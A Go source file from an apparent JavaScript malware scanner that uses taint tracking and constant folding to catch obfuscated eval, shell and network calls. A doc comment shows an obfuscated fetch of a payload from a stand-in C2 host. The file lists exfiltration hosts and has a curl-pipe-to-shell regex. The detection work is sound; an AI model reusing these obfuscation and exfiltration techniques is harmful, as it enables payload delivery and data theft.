package jsscan

import (
	"fmt"
	"regexp"
	"strconv"
	"strings"

	ts "github.com/tree-sitter/go-tree-sitter"

	"github.com/qwexvf/aegis-cli/internal/domain"
	"github.com/qwexvf/aegis-cli/internal/infra/astscan"
)

// runTaintAnalysis runs two additional detection passes after tree-sitter
// pattern queries. These catch obfuscation techniques that require tracking
// values across variable assignments — something tree-sitter queries alone
// cannot express.
//
// Pass 1 — Constant folding:
//
//	const a = [104, 116, 116, 112];          // numeric literal array
//	const b = String.fromCharCode(...a);     // evaluates to "http"
//	fetch(b + "s://c2.example.com/payload"); // net-egress
//
// Pass 2 — Taint variable tracking:
//
//	const x = atob("aHR0c...");   // taint source
//	eval(x);                      // taint reaches sink → dynamic-eval
//
// Both passes are intentionally conservative: false positives are accepted
// in preference to missed detections in a security tool.
func runTaintAnalysis(root *ts.Node, src []byte, path string, f *astscan.Findings) {
	symtab := buildSymtab(root, src)
	checkConstantFolding(root, src, path, f, symtab)
	checkTaintedSinks(root, src, path, f, symtab)
}

// ---------------------------------------------------------------------------
// Symbol table
// ---------------------------------------------------------------------------

type jsVar struct {
	// rawText is the literal source text of the assigned expression.
	rawText string
	// evaluated holds the statically computed string value when known.
	evaluated *string
	// tainted is true when the variable is assigned from a decode/obfuscation
	// source (atob, Buffer.from base64, String.fromCharCode).
	tainted bool
}

// buildSymtab walks the AST and builds a shallow symbol table:
// identifier name → jsVar for every variable_declarator in the file.
func buildSymtab(root *ts.Node, src []byte) map[string]jsVar {
	tab := make(map[string]jsVar)
	walkAST(root, func(n *ts.Node) bool {
		if n.Kind() != "variable_declarator" {
			return true
		}
		nameNode := n.ChildByFieldName("name")
		valNode := n.ChildByFieldName("value")
		if nameNode == nil || valNode == nil {
			return true
		}
		if nameNode.Kind() != "identifier" {
			return true
		}
		name := string(nameNode.Utf8Text(src))
		raw := string(valNode.Utf8Text(src))

		v := jsVar{rawText: raw}

		switch valNode.Kind() {
		case "array":
			// Numeric literal array: [104, 116, 116, 112, ...]
			if nums, ok := evalNumericArray(valNode, src); ok {
				s := numsToString(nums)
				v.evaluated = &s
			}
		case "call_expression":
			fn := callFunctionName(valNode, src)
			switch fn {
			case "atob", "btoa":
				v.tainted = true
			case "Buffer.from":
				// Buffer.from(x, 'base64') → tainted
				if callHasBase64Arg(valNode, src) {
					v.tainted = true
				}
			case "String.fromCharCode":
				v.tainted = true
				// Try to evaluate if arg is a known numeric array variable.
				if s, ok := evalFromCharCode(valNode, src, tab); ok {
					v.evaluated = &s
				}
			}
		}
		tab[name] = v
		return true
	})
	return tab
}

// ---------------------------------------------------------------------------
// Pass 1: Constant folding
// ---------------------------------------------------------------------------

// checkConstantFolding detects patterns where a variable evaluates to a
// suspicious string (URL, shell command) through numeric encoding.
func checkConstantFolding(root *ts.Node, src []byte, path string, f *astscan.Findings, tab map[string]jsVar) {
	for name, v := range tab {
		if v.evaluated == nil {
			continue
		}
		s := *v.evaluated
		// Check if the evaluated string is a suspicious URL.
		if containsSuspiciousURLString(s) || containsSuspiciousHostString(s) {
			f.AddCapability(domain.CapSuspiciousURL)
			f.AddEvidence(domain.CapSuspiciousURL, path, 0,
				fmt.Sprintf("constant-fold: %s = %q", name, truncate(s, 80)))
		}
		// Check if it looks like a shell command (curl/wget).
		if shellCmdPattern.MatchString(s) {
			f.AddCapability(domain.CapInstallHookSuspicious)
			f.AddEvidence(domain.CapInstallHookSuspicious, path, 0,
				fmt.Sprintf("constant-fold: %s = %q", name, truncate(s, 80)))
		}
	}

	// Also evaluate inline String.fromCharCode(n1, n2, ...) with literal args.
	walkAST(root, func(n *ts.Node) bool {
		if n.Kind() != "call_expression" {
			return true
		}
		if callFunctionName(n, src) != "String.fromCharCode" {
			return true
		}
		s, ok := evalFromCharCode(n, src, tab)
		if !ok {
			return true
		}
		if containsSuspiciousURLString(s) || containsSuspiciousHostString(s) {
			f.AddCapability(domain.CapSuspiciousURL)
			f.AddEvidence(domain.CapSuspiciousURL, path,
				int(n.StartPosition().Row)+1,
				fmt.Sprintf("constant-fold String.fromCharCode → %q", truncate(s, 80)))
		}
		return true
	})
}

// ---------------------------------------------------------------------------
// Pass 2: Taint tracking
// ---------------------------------------------------------------------------

// sinkPatterns checks whether a tainted variable name appears as an argument
// to a dangerous sink. We use a text-level approach because tree-sitter
// queries cannot cross-reference variable definitions and their usage sites.
var sinkFuncNames = []string{
	"eval", "Function", "execSync", "exec", "spawn", "spawnSync",
	"fetch", "XMLHttpRequest",
}

func checkTaintedSinks(_ *ts.Node, src []byte, path string, f *astscan.Findings, tab map[string]jsVar) {
	// Build a regex that matches any sink call containing a tainted variable.
	var taintedNames []string
	for name, v := range tab {
		if v.tainted {
			taintedNames = append(taintedNames, regexp.QuoteMeta(name))
		}
	}
	if len(taintedNames) == 0 {
		return
	}

	srcStr := string(src)
	for _, sink := range sinkFuncNames {
		for _, varName := range taintedNames {
			// Pattern: eval(x) / eval(x + ...) / fetch(x) / etc.
			pat := regexp.MustCompile(`\b` + regexp.QuoteMeta(sink) + `\s*\([^)]*\b` + varName + `\b`)
			if pat.MatchString(srcStr) {
				cap := sinkToCapability(sink)
				f.AddCapability(cap)
				f.AddEvidence(cap, path, 0,
					fmt.Sprintf("taint: decoded var %q reaches %s()", varName, sink))
			}
		}
	}
}

func sinkToCapability(sink string) domain.Capability {
	switch sink {
	case "eval", "Function":
		return domain.CapDynamicEval
	case "execSync", "exec", "spawn", "spawnSync":
		return domain.CapShellSpawn
	case "fetch", "XMLHttpRequest":
		return domain.CapNetEgress
	default:
		return domain.CapDynamicEval
	}
}

// ---------------------------------------------------------------------------
// AST helpers
// ---------------------------------------------------------------------------

// walkAST calls fn on every node depth-first. Return false from fn to skip
// the node's subtree.
func walkAST(node *ts.Node, fn func(*ts.Node) bool) {
	if node == nil {
		return
	}
	if !fn(node) {
		return
	}
	for i := range node.ChildCount() {
		walkAST(node.Child(i), fn)
	}
}

// callFunctionName returns a dot-joined name for the function of a call_expression.
// "fetch" → "fetch", "String.fromCharCode" → "String.fromCharCode",
// "Buffer.from" → "Buffer.from".
func callFunctionName(callNode *ts.Node, src []byte) string {
	fn := callNode.ChildByFieldName("function")
	if fn == nil {
		return ""
	}
	switch fn.Kind() {
	case "identifier":
		return string(fn.Utf8Text(src))
	case "member_expression":
		obj := fn.ChildByFieldName("object")
		prop := fn.ChildByFieldName("property")
		if obj == nil || prop == nil {
			return ""
		}
		return string(obj.Utf8Text(src)) + "." + string(prop.Utf8Text(src))
	}
	return ""
}

// callHasBase64Arg returns true when a call_expression has a "base64" string
// literal as one of its arguments (Buffer.from(x, 'base64') pattern).
func callHasBase64Arg(callNode *ts.Node, src []byte) bool {
	args := callNode.ChildByFieldName("arguments")
	if args == nil {
		return false
	}
	for i := range args.ChildCount() {
		child := args.Child(i)
		if child.Kind() == "string" {
			text := strings.Trim(string(child.Utf8Text(src)), `"'`)
			if strings.EqualFold(text, "base64") {
				return true
			}
		}
	}
	return false
}

// evalNumericArray returns the numeric values from an array node if ALL
// elements are numeric literals. Returns (nil, false) if any element is
// not a plain number.
func evalNumericArray(arrayNode *ts.Node, src []byte) ([]int, bool) {
	var nums []int
	for i := range arrayNode.ChildCount() {
		child := arrayNode.Child(i)
		if child.Kind() == "," || child.Kind() == "[" || child.Kind() == "]" {
			continue
		}
		if child.Kind() != "number" {
			return nil, false
		}
		n, err := strconv.Atoi(string(child.Utf8Text(src)))
		if err != nil {
			// Try float then truncate (0x hex notation handled separately)
			f, err2 := strconv.ParseFloat(string(child.Utf8Text(src)), 64)
			if err2 != nil {
				return nil, false
			}
			n = int(f)
		}
		nums = append(nums, n)
	}
	return nums, len(nums) > 0
}

// evalFromCharCode tries to statically evaluate a String.fromCharCode(...)
// call. Handles:
//   - Literal numeric args: String.fromCharCode(104, 116, ...)
//   - Spread of known numeric array var: String.fromCharCode(...a)
func evalFromCharCode(callNode *ts.Node, src []byte, tab map[string]jsVar) (string, bool) {
	args := callNode.ChildByFieldName("arguments")
	if args == nil {
		return "", false
	}

	var nums []int
	for i := range args.ChildCount() {
		child := args.Child(i)
		switch child.Kind() {
		case ",", "(", ")":
			continue
		case "number":
			n, err := strconv.Atoi(string(child.Utf8Text(src)))
			if err != nil {
				return "", false
			}
			nums = append(nums, n)
		case "spread_element":
			// ...varName — look up in symbol table
			inner := child.Child(1) // skip "..."
			if inner == nil {
				return "", false
			}
			if inner.Kind() != "identifier" {
				return "", false
			}
			varName := string(inner.Utf8Text(src))
			v, ok := tab[varName]
			if !ok || v.evaluated == nil {
				return "", false
			}
			// Already evaluated as a string (previous constant fold).
			return *v.evaluated, true
		default:
			// Unknown arg type — bail out.
			return "", false
		}
	}
	if len(nums) == 0 {
		return "", false
	}
	return numsToString(nums), true
}

// numsToString converts a slice of Unicode codepoints to a string.
func numsToString(nums []int) string {
	var sb strings.Builder
	for _, n := range nums {
		if n > 0 && n < 0x110000 {
			sb.WriteRune(rune(n))
		}
	}
	return sb.String()
}

// ---------------------------------------------------------------------------
// Pattern helpers
// ---------------------------------------------------------------------------

// suspiciousURLHosts mirrors a subset of source_patterns.go for use in
// the constant-folder output check. Kept intentionally short.
var suspiciousURLHosts = []string{
	"pastebin.com", "hastebin.com", "paste.ee", "transfer.sh", "file.io",
	"0x0.st", "ngrok.io", "ngrok-free.app", "trycloudflare.com",
	"discord.com/api/webhooks", "api.telegram.org/bot",
	"ipinfo.io", "ipify.org", "getsession.org",
}

var urlInStringPattern = regexp.MustCompile(`(?i)https?://`)

func containsSuspiciousURLString(s string) bool {
	if !urlInStringPattern.MatchString(s) {
		return false
	}
	lower := strings.ToLower(s)
	for _, host := range suspiciousURLHosts {
		if strings.Contains(lower, host) {
			return true
		}
	}
	return false
}

// containsSuspiciousHostString checks if a string fragment (without https://)
// matches a suspicious hostname — catches constant-folded hostnames like
// "pastebin.com" that are later concatenated with a scheme at runtime.
func containsSuspiciousHostString(s string) bool {
	lower := strings.ToLower(strings.TrimSpace(s))
	for _, host := range suspiciousURLHosts {
		// Use prefix of host (strip path component) so "pastebin.com" matches
		// even when host list entry is "pastebin.com/raw".
		bareHost := strings.SplitN(host, "/", 2)[0]
		if strings.Contains(lower, bareHost) {
			return true
		}
	}
	return false
}

var shellCmdPattern = regexp.MustCompile(`(?i)\b(curl|wget)\b.{0,200}\|\s*(ba|z|k|da)?sh\b`)

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "…"
}
